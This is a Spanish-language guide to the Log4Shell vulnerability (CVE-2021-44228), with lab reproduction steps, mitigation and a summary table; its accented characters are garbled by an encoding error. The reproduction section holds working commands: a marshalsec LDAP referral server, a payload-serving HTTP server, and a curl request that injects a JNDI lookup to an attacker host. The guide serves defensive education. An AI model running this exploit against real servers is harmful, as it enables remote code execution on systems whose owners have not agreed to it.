# CVE-2021-44228 Gu√≠a de Vulnerabilidad: Log4Shell

## üîé Descripci√≥n General

- **CVE-2021-44228**: Una vulnerabilidad cr√≠tica en Apache Log4j que permite a los atacantes ejecutar c√≥digo remotamente mediante el registro de datos manipulados.

## ‚ö†Ô∏è Impacto

Permite a un atacante ejecutar c√≥digo remotamente enviando datos especialmente dise√±ados que son registrados por Log4j.

## üß™ Reproducci√≥n (Solo en Laboratorio Aislado)

**Pasos para reproducir:**

1. Instala una versi√≥n vulnerable de Log4j (por ejemplo, 2.14.1).
2. Levanta un servidor que registre entradas de usuario con Log4j (por ejemplo, una aplicaci√≥n Java sencilla).
3. Configura un servidor LDAP falso con `marshalsec`:
   ```bash
   git clone https://github.com/mbechler/marshalsec.git
   cd marshalsec
   mvn clean package -DskipTests
   java -cp target/marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<tu-ip>:8080/#Exploit
   ```
4. Inicia un servidor HTTP que sirva el payload:
   ```bash
   python3 -m http.server 8080
   ```
5. Env√≠a una solicitud HTTP con el payload:
   ```bash
   curl http://victima.com -H 'User-Agent: ${jndi:ldap://<tu-ip>:1389/Exploit}'
   ```
6. Observa si se ejecuta el c√≥digo desde tu payload en el servidor v√≠ctima.


‚ö†Ô∏è **Advertencia:** Nunca pruebes estas t√©cnicas fuera de un entorno de laboratorio controlado y con autorizaci√≥n expl√≠cita.

## üõ°Ô∏è Mitigaci√≥n

Actualizar Log4j a la versi√≥n 2.17.0 o superior. Tambi√©n puedes eliminar la clase `JndiLookup` del classpath como mitigaci√≥n temporal.

## üìù Glosario

- **RCE**: Ejecuci√≥n remota de c√≥digo.
- **PoC**: Prueba de concepto.
- **LDAP**: Protocolo de acceso ligero a directorios.

## ‚úÖ Tabla Resumen

| Aspecto              | Detalles                    |
|----------------------|-----------------------------|
| ID CVE               | CVE-2021-44228                    |
| Nombre               | Log4Shell                     |
| Impacto              | Permite a un atacante ejecutar c√≥digo remotamente enviando datos especialmente dise√±ados que son registrados por Log4j      |
| Tipo de Explotaci√≥n  | RCE                         |
| Requiere Autenticaci√≥n | No                        |
| Mitigaci√≥n           | Actualizar Log4j a la versi√≥n 2  |

## üîÑ Pr√≥ximos Pasos

- Verificar si tu sistema est√° afectado.
- Aplicar los parches necesarios.
- Configurar controles de mitigaci√≥n adicionales si no se puede parchear inmediatamente.
